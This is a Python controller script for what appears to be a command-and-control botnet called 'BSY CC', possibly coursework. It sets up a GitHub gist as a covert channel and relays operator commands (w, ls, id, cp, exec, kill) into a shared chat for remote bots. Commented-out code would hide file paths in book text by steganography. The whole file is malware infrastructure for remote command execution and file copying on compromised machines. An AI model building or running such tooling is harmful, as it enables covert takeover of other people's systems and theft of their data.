import sys

sys.path.append('..')
from common.utils import add_message, check_chat_file
from common.utils import CONTROLLER_NICK_NAME
from common.gist import init_gist
# from common.chapters import get_chapter_for_path_encoding, read_chapter
# from common.steganography import encode_to_text


# def encode_path(pth):
#     chapter_for_encoding = get_chapter_for_path_encoding()
#     chapter_text = read_chapter(chapter_for_encoding)
#     encoded_pth, used_length = encode_to_text(pth, chapter_text)
#     return encoded_pth[0:used_length]


def process_cmd(cmd):
    if len(cmd) == 0:
        return

    if cmd == 'w':
        print('Adding w command...')
    elif cmd.startswith('ls '):
        print('Adding ls command...')
    elif cmd == 'id':
        print('Adding id command...')
    elif cmd.startswith('cp '):
        print('Adding cp command...')
    elif cmd.startswith('exec '):
        print('Adding exec command...')
    elif cmd == 'kill':
        print('Adding kill command...')
    else:
        print(f'Unknown command: {cmd}')

    add_message(cmd, CONTROLLER_NICK_NAME)


def run():
    print('Controller is starting...')
    init_gist()
    check_chat_file()
    print('Controller is running...')

    while True:
        cmd = input('BSY CC > ')

        if cmd == 'exit' or cmd == 'quit':
            print('Exiting BSY CC...')
            break

        process_cmd(cmd)


if __name__ == '__main__':
    run()
